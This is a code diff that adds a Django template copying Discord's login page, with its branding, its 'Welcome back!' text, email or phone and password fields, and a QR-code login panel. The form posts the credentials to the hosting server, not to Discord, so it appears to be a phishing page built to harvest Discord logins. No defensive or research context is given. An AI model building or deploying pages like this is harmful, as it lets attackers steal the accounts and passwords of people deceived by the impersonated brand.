@@ -1,0 +1,40 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Discord</title>
+
+    <link rel="stylesheet" href="{% static 'css/discord/Discord.css' %}">
+    <link rel="shortcut icon" href="{% static 'images/discord/favicon.ico' %}" type="image/x-icon">
+</head>
+
+<body style="
+background-image: url('{% static 'images/discord/Back.jpg' %}');">
+    <div id="container">
+        <div class="discord"><img src="{% static 'images/discord/Discord.webp' %}" alt=""></div>
+        <form method="POST" action="" class="left">
+            {% csrf_token %}
+            <h1>Welcome back!</h1>
+            <p class="so">We're so excited to see you again!</p>
+
+            <h2>EMAIL OR PHONE NUMBER</h2>
+            {{ form.email }}
+            <h2>PASSWORD</h2>
+            {{ form.password }}
+            <a href="https://discord.com/login" class="pass">Forgot your password?</a>
+            <button>Login</button>
+            <p class="acc">Need an account?<a href="https://discord.com/login">Register</a></p>
+        </form>
+        <div class="right">
+            <img src="{% static 'images/discord/QR.png' %}" alt="">
+            <h1>Log in with QR Code</h1>
+            <p>Scan this with the Discord mobile app to log in instantly.</p>
+        </div>
+    </div>
+</body>
+
+</html>
